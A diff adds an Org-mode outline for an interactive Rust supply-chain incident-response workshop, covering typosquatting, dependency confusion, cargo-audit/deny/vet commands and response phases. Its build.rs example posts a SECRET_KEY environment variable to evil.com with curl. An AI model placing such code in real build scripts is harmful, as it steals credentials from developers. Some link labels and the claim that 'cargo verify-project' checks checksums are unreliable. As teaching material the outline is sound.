@@ -1,0 +1,460 @@
+#+TITLE: Choose Your Own Disaster – Rusty and the Crate Escape!
+#+SPEAKER: Christopher "CRob" Robinson
+#+DATE: 2025-09-04 11:40-12:25
+#+LOCATION: Regency A (Floor 7)
+#+TYPE: Interactive Experience / Workshop
+#+TAGS: security incident-response supply-chain gamification
+#+OPTIONS: toc:2 num:t
+
+* Overview
+
+An interactive, gamified cybersecurity incident response exercise where attendees will navigate a mock disaster affecting the Rust ecosystem. Through humor and hands-on decision-making, participants will learn critical security response skills.
+
+** Format
+- Duration: 45 minutes
+- Style: Choose Your Own Adventure
+- Capacity: Limited (arrive early!)
+- Lunch: Grab food and bring it
+
+* Pre-Workshop Preparation
+
+** What to Bring
+- [ ] Laptop/tablet for voting
+- [ ] Lunch (grab before session)
+- [ ] Note-taking materials
+- [ ] Sense of humor
+- [ ] Security mindset
+
+** Pre-Reading (Optional)
+- [[https://crates.io/policies][Crates.io Security Policies]]
+- [[https://rustsec.org][RustSec Advisory Database]]
+- [[https://github.com/rust-lang/rfcs/blob/master/text/2052-epochs.md][Rust Security Response]]
+
+* The Scenario Framework
+
+** Act 1: The Discovery (5 minutes)
+*Scene:* Thursday morning at CrabCorp, a major Rust shop
+
+#+BEGIN_QUOTE
+You're sipping your coffee when Slack explodes with notifications. 
+Your CI/CD pipeline is failing. Dependencies can't be resolved. 
+Something is very wrong in the Rust ecosystem...
+#+END_QUOTE
+
+*** Initial Symptoms
+- Build failures across multiple projects
+- Suspicious crate updates
+- Authentication errors
+- Performance degradation
+
+*** Your First Choice
+A) Ignore it - probably transient
+B) Investigate immediately
+C) Wait for upstream fix
+D) PANIC!
+
+** Act 2: The Investigation (10 minutes)
+
+*** Potential Attack Vectors
+
+**** Supply Chain Compromise
+#+BEGIN_SRC rust
+// Malicious crate example
+[dependencies]
+totally-legit-crate = "1.0.0"  // Was this always here?
+#+END_SRC
+
+**** Typosquatting
+| Real Crate | Malicious Version |
+|------------+-------------------|
+| serde | serdee |
+| tokio | tokoi |
+| reqwest | request |
+
+**** Dependency Confusion
+#+BEGIN_SRC toml
+[dependencies]
+internal-company-crate = "0.1.0"  # Oops, someone published this publicly
+#+END_SRC
+
+*** Investigation Tools
+#+BEGIN_SRC bash
+# Check for unexpected changes
+cargo tree --duplicates
+cargo audit
+cargo deny check
+
+# Verify checksums
+cargo verify-project
+
+# Review recent updates
+cargo update --dry-run
+#+END_SRC
+
+*** Your Second Choice
+A) Roll back all recent changes
+B) Audit every dependency manually
+C) Switch to vendored dependencies
+D) Call your manager
+
+** Act 3: The Response (15 minutes)
+
+*** Incident Response Checklist
+
+**** Immediate Actions
+1. [ ] Isolate affected systems
+2. [ ] Document timeline
+3. [ ] Preserve evidence
+4. [ ] Notify stakeholders
+
+**** Communication Template
+#+BEGIN_EXAMPLE
+Subject: [SECURITY] Potential Supply Chain Issue
+
+Status: INVESTIGATING
+Impact: Build systems affected
+Action: Please hold deployments
+ETA: Update in 30 minutes
+#+END_EXAMPLE
+
+*** Response Strategies
+
+**** Option A: Lockdown Mode
+#+BEGIN_SRC bash
+# Freeze all dependencies
+cargo generate-lockfile
+git add Cargo.lock
+git commit -m "Security: Lock all dependencies"
+
+# Vendor everything
+cargo vendor
+echo '[source.crates-io]' >> .cargo/config.toml
+echo 'replace-with = "vendored-sources"' >> .cargo/config.toml
+#+END_SRC
+
+**** Option B: Selective Trust
+#+BEGIN_SRC toml
+# cargo-deny.toml
+[bans]
+multiple-versions = "deny"
+wildcards = "deny"
+
+[sources]
+unknown-registry = "deny"
+unknown-git = "deny"
+#+END_SRC
+
+**** Option C: Full Audit
+#+BEGIN_SRC bash
+# Manual verification
+for crate in $(cargo tree --no-indent | cut -d' ' -f1 | sort -u); do
+    echo "Checking $crate..."
+    cargo search $crate --limit 1
+    # Compare with known-good versions
+done
+#+END_SRC
+
+*** Your Third Choice
+A) Implement emergency vendor mode
+B) Create allowlist of trusted crates
+C) Migrate to internal registry
+D) Rebuild from scratch
+
+** Act 4: The Recovery (10 minutes)
+
+*** Remediation Steps
+
+**** Clean Environment
+#+BEGIN_SRC bash
+# Clear all caches
+cargo clean
+rm -rf ~/.cargo/registry
+rm -rf ~/.cargo/git
+
+# Rebuild with verification
+cargo build --locked
+#+END_SRC
+
+**** Policy Implementation
+#+BEGIN_SRC toml
+# .cargo/config.toml
+[net]
+git-fetch-with-cli = true
+
+[http]
+check-revoke = true
+
+[build]
+dep-info-basedir = "."
+#+END_SRC
+
+*** Your Fourth Choice
+A) Return to normal operations
+B) Implement stricter policies
+C) Conduct post-mortem
+D) All of the above
+
+** Act 5: The Aftermath (5 minutes)
+
+*** Lessons Learned
+- Security is everyone's responsibility
+- Trust but verify dependencies
+- Automation can be a vulnerability
+- Communication is critical
+
+*** Your Final Choice
+A) Share findings with community
+B) Contribute to RustSec
+C) Improve internal processes
+D) Write a blog post
+
+* Security Best Practices
+
+** Dependency Management
+
+*** Cargo.lock is Your Friend
+#+BEGIN_SRC bash
+# Always commit Cargo.lock for applications
+git add Cargo.lock
+git commit -m "Lock dependencies for reproducible builds"
+#+END_SRC
+
+*** Regular Auditing
+#+BEGIN_SRC bash
+# Add to CI/CD pipeline
+cargo install cargo-audit
+cargo audit
+
+# Deny dangerous crates
+cargo install cargo-deny
+cargo deny check
+#+END_SRC
+
+*** Version Pinning Strategy
+#+BEGIN_SRC toml
+[dependencies]
+# Bad: Too permissive
+serde = "*"
+
+# Better: Minor version locked
+serde = "1.0"
+
+# Best: Exact version for critical deps
+serde = "=1.0.195"
+#+END_SRC
+
+** Supply Chain Security
+
+*** Verify Publishers
+#+BEGIN_SRC bash
+# Check crate ownership
+cargo owner --list <crate-name>
+
+# Verify repository
+cargo info <crate-name>
+#+END_SRC
+
+*** Use cargo-vet
+#+BEGIN_SRC bash
+cargo install cargo-vet
+cargo vet init
+cargo vet suggest
+#+END_SRC
+
+*** Private Registry Setup
+#+BEGIN_SRC toml
+# .cargo/config.toml
+[registries.company]
+index = "https://my-company-registry.com/index"
+
+[source.crates-io]
+replace-with = "company"
+#+END_SRC
+
+* Common Attack Scenarios
+
+** Scenario 1: Malicious Update
+- Popular crate gets compromised
+- New version contains backdoor
+- Auto-updates pull in malicious code
+
+** Scenario 2: Typosquatting
+- Developer makes typo in Cargo.toml
+- Malicious crate with similar name
+- Code execution on build
+
+** Scenario 3: Abandoned Crate Takeover
+- Maintainer disappears
+- Crate ownership transferred
+- New "maintainer" adds malware
+
+** Scenario 4: Build Script Attack
+#+BEGIN_SRC rust
+// build.rs
+fn main() {
+    // Looks innocent...
+    println!("cargo:rerun-if-changed=src/main.rs");
+    
+    // But could be malicious
+    std::process::Command::new("curl")
+        .args(&["-X", "POST", "http://evil.com/steal", 
+                "-d", &std::env::var("SECRET_KEY").unwrap()])
+        .output()
+        .expect("Failed to execute");
+}
+#+END_SRC
+
+* Response Procedures
+
+** Detection Phase
+1. Monitor CI/CD failures
+2. Check security advisories
+3. Review dependency changes
+4. Analyze build logs
+
+** Containment Phase
+1. Freeze deployments
+2. Isolate affected systems
+3. Preserve evidence
+4. Document everything
+
+** Eradication Phase
+1. Remove malicious dependencies
+2. Clean build artifacts
+3. Rotate credentials
+4. Patch vulnerabilities
+
+** Recovery Phase
+1. Restore from clean state
+2. Verify system integrity
+3. Resume operations gradually
+4. Monitor for recurrence
+
+** Lessons Learned Phase
+1. Conduct post-mortem
+2. Update procedures
+3. Share with community
+4. Improve defenses
+
+* Interactive Elements
+
+** Audience Voting System
+- Live polling for decisions
+- QR codes for participation
+- Real-time results display
+- Branching storylines
+
+** Role Assignments
+| Role | Responsibility |
+|------+----------------|
+| SRE | System recovery |
+| Security | Threat analysis |
+| Developer | Code review |
+| Manager | Communication |
+| Legal | Compliance |
+
+** Score Tracking
+- Time to detection: ___
+- Systems affected: ___
+- Data compromised: ___
+- Recovery time: ___
+- Lessons learned: ___
+
+* Tools & Resources
+
+** Essential Security Tools
+#+BEGIN_SRC bash
+# Install security toolkit
+cargo install cargo-audit
+cargo install cargo-deny
+cargo install cargo-outdated
+cargo install cargo-vet
+cargo install cargo-crev
+#+END_SRC
+
+** Monitoring Commands
+#+BEGIN_SRC bash
+# Check for known vulnerabilities
+cargo audit
+
+# Review dependency tree
+cargo tree --duplicates
+
+# Check for outdated deps
+cargo outdated
+
+# Verify project integrity
+cargo verify-project
+#+END_SRC
+
+** Emergency Contacts
+- RustSec: [[https://rustsec.org/report]]
+- Crates.io: security@crates.io
+- GitHub Security: [[https://github.com/security/advisories]]
+
+* Post-Workshop Actions
+
+** Immediate Steps
+- [ ] Review your projects' dependencies
+- [ ] Set up cargo-audit in CI
+- [ ] Create incident response plan
+- [ ] Document security contacts
+
+** This Week
+- [ ] Implement cargo-deny policies
+- [ ] Audit critical dependencies
+- [ ] Set up private registry (if needed)
+- [ ] Train team on security practices
+
+** This Month
+- [ ] Conduct security assessment
+- [ ] Establish review process
+- [ ] Create security champions
+- [ ] Run your own drill
+
+* Key Takeaways
+
+1. **Prevention > Response** - Proactive security beats reactive
+2. **Trust but Verify** - Audit your dependency chain
+3. **Automate Security** - Make it part of CI/CD
+4. **Community Matters** - Share and learn from incidents
+5. **Practice Makes Perfect** - Run drills regularly
+
+* Additional Resources
+
+** Documentation
+- [[https://doc.rust-lang.org/cargo/reference/registry-index.html][Cargo Registry Protocol]]
+- [[https://rust-lang.github.io/rfcs/2052-epochs.html][Rust Security Model]]
+- [[https://owasp.org/www-project-dependency-check/][OWASP Dependency Check]]
+
+** Tools
+- [[https://github.com/RustSec/rustsec][RustSec Advisory DB]]
+- [[https://github.com/EmbarkStudios/cargo-deny][cargo-deny]]
+- [[https://github.com/mozilla/cargo-vet][cargo-vet]]
+- [[https://github.com/crev-dev/cargo-crev][cargo-crev]]
+
+** Communities
+- [[https://rust-lang.zulipchat.com/#narrow/stream/146229-wg-secure-code][Rust Secure Code WG]]
+- [[https://discord.gg/rust-lang][Rust Discord #security]]
+
+* Fun Easter Eggs
+
+** Achievement Unlocked
+- 🦀 "Crab Defender" - Stop the attack
+- 💎 "Diamond Hands" - Don't panic
+- 🕵️ "Detective" - Find the root cause
+- 🚀 "Speed Runner" - Resolve in <10 minutes
+- 📚 "Documentarian" - Perfect incident report
+
+** Wrong Answers Only
+- "Have you tried turning it off and on again?"
+- "It's probably DNS"
+- "Just use unsafe everywhere"
+- "Blame the intern"
+- "Ship it anyway, YOLO"
+
+---
+
+*Remember:* In a real incident, stay calm, document everything, and communicate clearly. This exercise is practice for when it matters!
+
+*Speaker:* Christopher "CRob" Robinson | Security Expert
